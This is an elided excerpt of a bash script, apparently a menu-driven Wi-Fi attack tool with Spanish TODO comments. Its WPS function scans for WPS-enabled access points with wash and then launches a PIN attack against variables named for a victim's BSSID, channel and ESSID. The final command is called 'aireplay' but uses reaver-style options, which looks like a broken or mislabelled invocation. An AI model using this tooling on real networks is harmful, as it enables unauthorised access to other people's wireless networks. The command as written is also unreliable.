...
#TODO: Añadir filtrado de ping por la ultima awk de unrecheable
#TODO: Añadir wps reaver comprobando con ls -la y grep reaver en /etc si no está, mkdir /etc/reaver
...
function main_menu () {
    ...
    echo -e "${red_color_slim}  005)${white_color} WPS menu"
    echo -e " ${white_color}[${normal_color}=================================${white_color}]${normal_color}"
...
function reaver_wps_pin_hack () {
    ...
    then
        ...
        echo
        echo -e "${white_color}  I'll run wash. It will stop after 10 seconds. ${red_color}DO NOT ${red_color_slim}Ctrl + C ${normal_color}"
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        clear
        timeout --preserve-status 10 wash -i ${interface_name_monitor} 
        echo
        echo
        ...
        read -p ""
        clear
        aireplay -i ${interface_name_monitor} -b ${victims_bssid} -c ${victims_channel} -e ${victims_essid} -d 15 -vv 
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        wps_menu
    fi
